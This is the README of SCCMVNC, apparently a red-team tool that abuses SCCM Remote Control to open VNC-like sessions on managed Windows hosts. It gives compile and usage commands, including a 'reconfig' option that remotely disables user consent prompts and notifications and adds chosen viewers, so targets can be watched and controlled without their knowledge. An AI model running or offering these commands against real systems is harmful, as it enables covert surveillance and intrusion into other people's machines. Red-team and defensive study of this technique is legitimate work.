# SCCMVNC
Imagine being able to connect to any SCCM-managed system using a VNC-like connection without the need for installing additional malicious modules, and even doing so remotely by exploiting SCCM Remote Control features.

## Details
https://www.netero1010-securitylab.com/red-team/abuse-sccm-remote-control-as-native-vnc

# Compile
```
c:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe SCCMVNC.cs
```

## Usage
```
Read existing SCCM Remote Control setting:
SCCMVNC.exe read [/target:CLIENT01]

Re-configure SCCM Remote Control setting to mute all the user conent requirement and notifications:
SCCMVNC.exe reconfig [/target:CLIENT01] [/viewonly] [viewer:user01,user02]
```

## Connect to the host via native SCCM Remote Control tool
I have attached a copy of the files required to use the native SCCM Remote Control tool. However, it is recommended to copy from your SCCM server.
```
CmRcViewer.exe <target hostname/IP>
```